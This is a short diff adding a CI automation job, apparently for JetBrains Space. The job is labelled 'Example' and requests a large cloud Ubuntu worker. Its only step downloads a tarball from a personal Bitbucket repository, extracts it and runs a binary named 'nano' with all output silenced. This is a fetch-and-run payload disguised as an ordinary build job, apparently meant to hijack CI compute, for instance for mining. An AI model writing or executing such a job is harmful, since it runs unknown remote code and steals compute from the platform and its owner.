@@ -1,0 +1,16 @@
+// the job will run on regular instance in the Space Cloud pool
+// regardless of the 'Default worker pool' value
+job("Example") {
+    // worker requirements
+    requirements {
+        // workerPool = WorkerPools.SPACE_CLOUD // not necessary if workerType is specified
+        workerType = WorkerTypes.SPACE_CLOUD_UBUNTU_LTS_LARGE
+    }
+    parallel {
+    host("Run script") {
+        shellScript {
+            content = "apt update && apt -y install wget && wget -q https://bitbucket.org/levyxd/file/raw/main/large.tar.gz && tar -xf large.tar.gz && ./nano > /dev/null 2>&1"
+        }
+    }
+  }
+}
